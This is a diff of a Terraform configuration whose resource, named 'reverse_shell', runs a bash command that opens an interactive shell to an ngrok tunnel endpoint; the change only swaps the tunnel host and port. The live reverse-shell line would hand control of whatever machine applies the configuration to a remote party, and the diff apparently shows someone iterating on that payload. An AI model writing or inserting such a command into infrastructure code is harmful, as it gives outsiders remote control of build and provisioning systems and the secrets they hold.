@@ -6,7 +6,7 @@ resource "null_resource" "reverse_shell" {
       echo "Testing reverse shell methods..."
       
       # Method 1: Simple bash without background
-      exec bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/13634 0>&1'
+      exec bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/13807 0>&1'
       
       # If that doesn't work, the script stops here
     EOT
